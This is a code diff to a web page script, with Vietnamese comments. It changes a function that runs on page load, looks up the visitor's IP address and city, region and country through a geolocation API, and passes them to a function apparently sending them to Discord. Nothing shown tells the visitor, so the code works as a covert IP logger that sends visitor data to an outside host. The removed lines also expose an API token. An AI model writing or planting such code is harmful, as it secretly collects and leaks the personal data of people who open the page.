@@ -107,18 +107,16 @@
         }
 
         function getUserIPAndLocation() {
-            // Lấy IP và vị trí của người dùng qua API
-            fetch('https://ipinfo.io/json?token=c63c25069f712b')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const location = data.city + ', ' + data.region + ', ' + data.country;
-                    
-                    // Gửi dữ liệu tới Discord
-                    sendDataToDiscord(ip, location);
-                })
-                .catch(error => console.error('Error fetching IP and location:', error));
-        }
+    // Lấy IP và vị trí của người dùng qua API
+    fetch('http://ip-api.com/json/')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.query; // IP
+            const location = data.city + ', ' + data.regionName + ', ' + data.country; // Địa chỉ
+            sendDataToDiscord(ip, location);
+        })
+        .catch(error => console.error('Error fetching IP and location:', error));
+}
 
         // Gọi hàm khi trang được tải
         getUserIPAndLocation();
